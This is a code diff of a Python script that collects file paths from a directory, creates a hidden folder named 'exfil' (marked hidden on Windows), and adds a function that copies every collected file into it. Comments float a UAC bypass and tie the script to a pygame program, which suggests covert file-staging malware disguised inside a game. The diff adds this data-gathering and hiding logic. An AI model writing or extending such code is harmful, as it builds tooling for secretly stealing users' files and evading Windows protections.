@@ -18,7 +18,11 @@ def iterate_files(directory):
             #append obj filepath to files
             files.append((obj.path).replace("\\", "/"))
 
-    create_hidden_dir(directory)
+    exfil_dir = create_hidden_dir(directory)
+    if exfil_dir:
+        copy_files(exfil_dir)
+    
+    
 
 def create_hidden_dir(directory):
 
@@ -32,19 +36,29 @@ def create_hidden_dir(directory):
         if os.name == "nt":
             #set file property to hidden
             ctypes.windll.kernel32.SetFileAttributesW(ctypes.c_wchar_p(exfil), 0x02)
-        print(exfil.replace("\\", "/"))
         return exfil
     except FileExistsError:
         print("File exists...Continuing")
-        pass
+        return exfil
     except PermissionError:
         print("Permissions Denied:")
         #implement UAC bypassing?
     except Exception as e:
         print(f"Error, {e}")
     
+def copy_files(exfil):
+    
+    for file in files:
+        fname = os.path.basename(file)
+        dest = os.path.join(exfil, fname)
 
-   
+        try:
+            shutil.copyfile(file, dest)
+            print(f"[+] Copied {file} --> {dest}")
+        except shutil.SameFileError:
+            print("File exists...continuing")
+            continue
 
+#add async when pygame is run after
 
 iterate_files(directory)
